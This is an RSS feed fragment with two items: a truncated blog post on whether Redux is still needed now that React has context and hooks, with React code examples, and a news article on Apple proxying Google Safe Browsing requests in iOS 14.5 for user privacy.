<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>React revolutionized front end development as most people knew it when it was first released. This new approach to writing code triggered incredible innovation in how to handle state changes and UI updates.</p><p>This revolution had its downsides, too. One of them was a culture of over-engineering solutions to challenges that could be solved in simpler ways. A typical example of this is how state has been managed in React applications.</p><p>Redux has become a hallmark of many React applications created in the last couple of years. The allure of having a single state object, available everywhere in your application sure sounds nice. But has its time passed? Has React evolved to a point where these kinds of state management tools add more complexity than they solve?</p><p>This article aims to give you a deeper understanding of which situations warrants state management tools like Redux. We’ll discuss the reasons behind the rise of Redux, and what has changed in the last couple of years - both in React and in Redux. Finally, we’ll look into what might be coming in the future.</p><h2 id="redux---and-why-people-started-using-it">Redux - and why people started using it</h2><p>When it was first released , React didn’t have an officially supported way to pass data far down the component tree. If you had some kind of shared state, configuration or other information you would like to use anywhere in you application, you had to pass it down from parent to child to sibling to another child. There <em>was</em> a way to avoid it, but that way - the “legacy context API” was never officially supported, and was documented with a warning that it should not be used.</p><p>About the same time React was released to the public, some other Facebook engineers <a href="https://www.youtube.com/watch?list=PLb0IAmt7-GS188xDYE-u1ShQmFFGbrk0v&amp;v=nYkdrAPrdcw&amp;feature=emb_title" target="_blank" rel="noreferrer">introduced a blueprint</a> for how they created front end applications - the <a href="https://facebook.github.io/flux/" target="_blank" rel="noreferrer">Flux architecture</a>. It complimented React’s component-centric design by having a unidirectional data flow, which made things both easy to follow and simple to understand.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/176421ef1740882c46b0283385b27764/ff5cf/d97c68cc0c034806aa6ff882a5f51995.png" srcset="https://blog.asayer.io/static/176421ef1740882c46b0283385b27764/ff5cf/d97c68cc0c034806aa6ff882a5f51995.png 1300w" sizes="(max-width: 1300px) 100vw, 1300px" alt="Flux Architecture">
<em>(photo borrowed from <a href="https://facebook.github.io/flux/docs/in-depth-overview" target="_blank" rel="noreferrer">https://facebook.github.io/flux/docs/in-depth-overview</a>)</em></p><p>While many famous open sourcerers were busy fighting over which slightly different implementation of this was the best, a young Russian developer named Dan Abramov introduced an implementation based on the <a href="https://guide.elm-lang.org/architecture/" target="_blank" rel="noreferrer">Elm architecture</a>, called Redux.</p><p><a href="https://youtu.be/xsSnOQynTHs" target="_blank" rel="noreferrer">https://youtu.be/xsSnOQynTHs</a></p><p>Redux was a pretty simple system, with a single state object, encased in a “store”, which could be updated by dispatching actions on it. The actions were sent to a “reducer” function, which returned a brand new copy of the entire application state, which would then propagate across your application.</p><p>Another great feature of Redux was how easy it was to use with React. Not only was it a great match with the programming model of React, it also solved the prop drilling issue! Just “connect” whatever component you want to a store, and you had access to any part of the application state you wanted. It was like magic!</p><h2 id="context-hooks-and-why-it-solved-much-of-what-redux-did">Context, hooks, and why it solved much of what Redux did</h2><p>With all its elegance and popularity though, Redux did have a few major downsides. For each new way of changing the state, you had to add a new action type and action creator, probably a dispatcher and a selector, and then you’d have to handle that new state change in an existing reducer, or create a new one. In other words - lots and lots of boilerplate.</p><p>When the 16.3 version of React was released, it finally shipped with a fully redesigned context API. With this new feature, prop drilling was suddenly as easy as wrapping any subsection of your application in a context provider, and fetching it again with a context consumer component.  Here’s an example of how that could be done:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>UserContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span><span>class</span><span> </span><span>MyApp</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>  state </span><span>=</span><span> </span><span>{</span><span> user</span><span>:</span><span> </span><span>null</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>componentDidMount</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>    myApi</span><span>.</span><span>getUser</span><span>(</span><span>)</span><span></span></p><p><span>6</span><span>      </span><span>.</span><span>then</span><span>(</span><span>user</span><span> </span><span>=&gt;</span><span> </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span> user </span><span>}</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span>  </span><span>}</span><span></span></p><p><span>8</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>10</span><span>      </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>user</span><span>}</span><span>&gt;</span><span></span></p><p><span>11</span><span>        </span><span>&lt;</span><span>SomeDeepHierarchy</span><span> </span><span>/</span><span>&gt;</span><span></span></p><p><span>12</span><span>      </span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Provider</span><span>&gt;</span><span></span></p><p><span>13</span><span>    </span><span>)</span><span>;</span><span></span></p><p><span>14</span><span>  </span><span>}</span><span></span></p><p><span>15</span><span></span><span>}</span><span>;</span><span></span></p><p><span>16</span><span></span><span>const</span><span> </span><span>UserGreeting</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>17</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>18</span><span>    </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Consumer</span><span>&gt;</span><span></span></p><p><span>19</span><span>      </span><span>{</span><span>user</span><span> </span><span>=&gt;</span><span> </span><span>(</span><span> </span><span></span></p><p><span>20</span><span>        </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Hello</span><span> there</span><span>,</span><span> </span><span>{</span><span>user</span><span>.</span><span>name</span><span> </span><span>||</span><span> </span><span>'customer'</span><span>}</span><span>!</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span></span></p><p><span>21</span><span>      </span><span>)</span><span>}</span><span></span></p><p><span>22</span><span>    </span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Consumer</span><span>&gt;</span><span></span></p><p><span>23</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>24</span><span></span><span>}</span><span>;</span></p></pre></div><p>At ReactConf in 2018, now React Core team member Dan Abramov and boss Sophie Alpert <a href="https://www.youtube.com/watch?v=V-QO-KO90iQ&amp;t=5s" target="_blank" rel="noreferrer">introduced a new feature</a> in React - hooks. Hooks made using state and side effects much easier, and made away with the need for class components altogether. In addition, the context API was suddenly much easier to consume, which made it much more user friendly. Here’s the revised code example with hooks:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>UserContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span><span>const</span><span> </span><span>useUser</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>  </span><span>const</span><span> </span><span>[</span><span>user</span><span>,</span><span> setUser</span><span>]</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>React</span><span>.</span><span>useEffect</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>    myApi</span><span>.</span><span>getUser</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>user</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>setUser</span><span>(</span><span>user</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span>  </span><span>}</span><span>,</span><span> </span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span><span></span></p><p><span>8</span><span></span><span>const</span><span> </span><span>MyApp</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>  </span><span>const</span><span> user </span><span>=</span><span> </span><span>useUser</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>11</span><span>    </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>user</span><span>}</span><span>&gt;</span><span></span></p><p><span>12</span><span>      </span><span>&lt;</span><span>SomeDeepHierarchy</span><span> </span><span>/</span><span>&gt;</span><span></span></p><p><span>13</span><span>    </span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Provider</span><span>&gt;</span><span></span></p><p><span>14</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>15</span><span></span><span>}</span><span>;</span><span></span></p><p><span>16</span><span></span><span>const</span><span> </span><span>UserGreeting</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>17</span><span>  </span><span>const</span><span> user </span><span>=</span><span> </span><span>React</span><span>.</span><span>useContext</span><span>(</span><span>UserContext</span><span>)</span><span>;</span><span></span></p><p><span>18</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Hello</span><span> there</span><span>,</span><span> </span><span>{</span><span>user</span><span>?</span><span>.</span><span>name</span><span> </span><span>?</span><span>?</span><span> </span><span>"customer"</span><span>}</span><span>!</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span>;</span><span></span></p><p><span>19</span><span></span><span>}</span><span>;</span></p></pre></div><p>With these new features landing in React, the trade-offs for using Redux changed quite a bit. The elegance of reducers were suddenly built into React itself, and prop-drilling was a solved challenge. New projects were started without having Redux in the stack - a previous no-brainer - and more and more projects started to consider moving away from Redux altogether.</p><p>As a response, the team currently maintaining Redux (led by a gentleman named Mark Eriksson) started two different efforts. They introduced an opinionated toolkit named <a href="https://redux-toolkit.js.org/" target="_blank" rel="noreferrer">Redux Toolkit</a> that did away with most boilerplate code through conventions, and they added a <a href="https://react-redux.js.org/api/hooks" target="_blank" rel="noreferrer">hooks-based API</a> for reading state and dispatching actions.</p><p>Together these two new updates simplified Redux codebases substantially. But is it really enough to defend introducing the added complexity of the concepts in Redux to a new project? Is the value Redux adds more than the added cost of teaching new employees about Yet Another Tool?</p><p>Let’s look at where React does a great job by itself, and in what cases the tradeoff of complexity vs power is worth it.</p><h2 id="when-react-is-enough">When React is enough</h2><p>Most React applications I’ve worked with have been pretty small in scope. They’ve had a few global pieces of state that was used across the application, and some data that was shared across a few different views.</p><p>Besides from this though, many React applications don’t have a lot of shared state. Most state  like the content of input fields or whether a modal is open, is only interesting to the component that contains them! No need to make that state globally available. </p><p>Other pieces of state might be shared, but only by a part of the application. Perhaps a particular page requires a piece of state to be shared across several of its components, or a sidebar needs to expose some remote status to all of its children. Either way, that’s not global state - it’s state scoped to a part of the application.</p><p>By keeping state co-located, or as close to its dependents as possible, you ensure that it’s deleted whenever the feature requiring it is deleted, and that it’s discoverable without leafing through tens of different reducers.</p><p>If you need to share app-wide settings that rarely change, React’s context API is a great tool to reach for. One example of this is what locale is currently active:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>LocaleContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>  locale</span><span>:</span><span> </span><span>"en-US"</span><span>,</span><span></span></p><p><span>3</span><span>  </span><span>setLocale</span><span>:</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>}</span><span>,</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span></span><span>const</span><span> </span><span>LocaleProvider</span><span> </span><span>=</span><span> </span><span>(</span><span>props</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  </span><span>const</span><span> </span><span>[</span><span>locale</span><span>,</span><span> setLocale</span><span>]</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>useState</span><span>(</span><span>"en-US"</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>LocaleContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>{</span><span> locale</span><span>,</span><span> setLocale </span><span>}</span><span>}</span><span> </span><span>{</span><span>...</span><span>props</span><span>}</span><span> </span><span>/</span><span>&gt;</span><span>;</span><span></span></p><p><span>8</span><span></span><span>}</span><span>;</span><span></span></p><p><span>9</span><span></span><span>const</span><span> </span><span>useLocale</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>React</span><span>.</span><span>useContext</span><span>(</span><span>LocaleContext</span><span>)</span><span>;</span></p></pre></div><p>Other use cases can be what color theme is active, or even what experiments are active for a given user.</p><p>Another very useful approach is using a small data-fetching library like <a href="https://swr.vercel.app/" target="_blank" rel="noreferrer">SWR</a> or <a href="https://react-query.tanstack.com/" target="_blank" rel="noreferrer">React-Query</a> to handle fetching and caching your API responses for you. To me, cached data isn’t really global state - it’s just cached data. This is much simpler to handle with these small single-use libraries, than introducing async thunks or sagas to your Redux rig. Also, you don’t have to handle all the complex variations of isLoading, hasError and what not. With these libraries, it works out of the box.</p><p>A thing these context use cases have in common is the fact that they represent data that rarely updates. Rarely in the context of computer science is a bit vague, but in my mind, less than a couple of times every second is pretty rare. And as it turns out, that’s the way the React Context API works best!</p><p>The use cases summarized above covers most of the situations I’ve met in real world applications. Actual global state is rare and far between, and is often better off being co-located with the code that actually uses it, or provided through the context API.</p><h2 id="situations-where-redux-might-be-warranted">Situations where Redux might be warranted</h2><p>With all that said, Redux is still a great product. It’s well documented, adopted by many, and can be combined with the approaches posted above. But what use cases warrants the added complexity and learning curve of adding Redux to your stack in 2021?</p><p>One of the use cases I see most in the projects I’m involved with is when you have advanced data fetching scenarios that requires a lot of cascading network communication. One might argue that this is best done on the server side, but there are definitely use cases where handing this on the client is warranted. Redux, particularly in combination with so-called thunks, is extremely versatile and flexible when it comes to such orchestration.</p><p>Another use case is for very interdependent states, or states that are derived from several other states. This is possible to handle in React as well, but the end result is still much easier to both share, reuse and reason about in Redux.</p><p>A third use case is for those where the state of your application can change very rapidly. The lead architect of React, Seb Markbåge, stated a few years ago that the current …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/is-redux-dead">https://blog.asayer.io/is-redux-dead</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/is-redux-dead</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111098</guid>
            <pubDate>Fri, 12 Feb 2021 05:53:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple redirects Google Safe Browsing traffic through proxy servers in iOS 14.5]]>
            </title>
            <description>
<![CDATA[
Score 387 | Comments 261 (<a href="https://news.ycombinator.com/item?id=26110928">thread link</a>) | @CharlesW
<br/>
February 11, 2021 | https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><strong>Update 1:58 AM PT:</strong> <em>Updated the post to clear confusion about how Google’s Safe Browsing feature works.</em></p>
<hr>
<p>Apple’s privacy push is much more widespread than it seems at the surface. A perfect example is the new privacy feature in <a href="https://the8-bit.com/ios-14-5-changes/">iOS 14.5 Beta 1 (V2)</a> which redirects Google Safe Browsing traffic through Apple’s own proxy servers to enhance users’ privacy and to not let Google see your IP address. </p>
<p>Google Safe Browsing is a security service created by Google that checks whether a website is malicious. When you access a website on the desktop version of Chrome on your Mac or PC, for instance, Google Safe Browsing checks if a website is safe to browse and displays a warning accordingly. The user ultimately has the choice, however.</p>
<p>As Reddit user u/jaydenkieran explains, Apple uses Google Safe Browsing when you enable “Fraudulent Website Warning” within the Safari settings in the Settings app on iPhone or iPad.</p>
<p><a aria-label="According to Google (opens in a new tab)" href="https://support.google.com/transparencyreport/answer/7380435?hl=en#zippy=%2Chow-do-you-determine-that-a-site-is-unsafe" target="_blank" rel="noreferrer noopener">According to Google</a>, its Safe Browsing system works by scanning sections of Google’s web index and “identifying potentially compromised websites.” Then, Google tests those websites by using a virtual machine to check if the website compromises the system. If it does, it’s added to Google’s online database. Google also identifies phishing websites by using statistical models. </p>
<p><a aria-label="According to Apple (opens in a new tab)" href="https://support.apple.com/en-ae/HT210675" target="_blank" rel="noreferrer noopener">According to Apple</a>, before visiting a website, Safari may send hashed prefixes of the URL (Apple terms it “information calculated from the website address”) to Google Safe Browsing to check if there’s a match. </p>
<p>Since Apple uses a hashed prefix, Google cannot learn which website the user is trying to visit. Up until iOS 14.5, Google could also see the IP address of where that request is coming from. However, since Apple now proxies Google Safe Browsing traffic, it further safeguards users’ privacy while browsing using Safari.</p>
<p>Apple has been intensifying its push for privacy with iOS 14 what with the <a href="https://the8-bit.com/app-tracking-transparency-guide/">App Tracking Transparency update and the inclusion of App Privacy Reports in the App Store</a>. </p><div><p>See also</p><div id="block-wrap-45850" data-id="45850" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/siri-now-allows-setting-a-default-music-streaming-service-on-ios-14-5/" title="Siri_Default_Music_App"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg" alt="Siri Default Music App" srcset="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-293x293.jpg 293w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>At the same time, companies like Facebook are actively opposing the Cupertino giant, accusing it of negatively affecting the advertising industry. Apple’s response has been simple: </p>
<p>“We believe that this is a simple matter of standing up for our users. Users should know when their data is being collected and shared across other apps and websites — and they should have the choice to allow that or not. App Tracking Transparency in iOS 14 does not require Facebook to change its approach to tracking users and creating targeted advertising, it simply requires they give users a choice.” </p>
<p>Google itself <a href="https://appleinsider.com/articles/21/02/04/google-still-hasnt-updated-its-ios-apps-while-pondering-android-privacy-controls" target="_blank" aria-label="had been holding off (opens in a new tab)" rel="noreferrer noopener">had been holding off</a> on updating its host of apps on the App Store due to the App Privacy Health Reports in the App Store that lets users view how an app tracks them. However, Google later disclosed that it will update its apps to include as little tracking as possible.</p>
<p>Having said that, it’s interesting to see Apple focus on enhancing user privacy as much as they can. And setting up a proxy server to filter Google Safe Browsing traffic just so Google cannot see users’ browsing activity will be a welcome move for a lot of users.</p>
</div><!-- .entry-content -->
</div></div>]]>
            </description>
            <link>https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26110928</guid>
            <pubDate>Fri, 12 Feb 2021 05:07:03 GMT</pubDate>
        </item>
    </channel>
</rss>
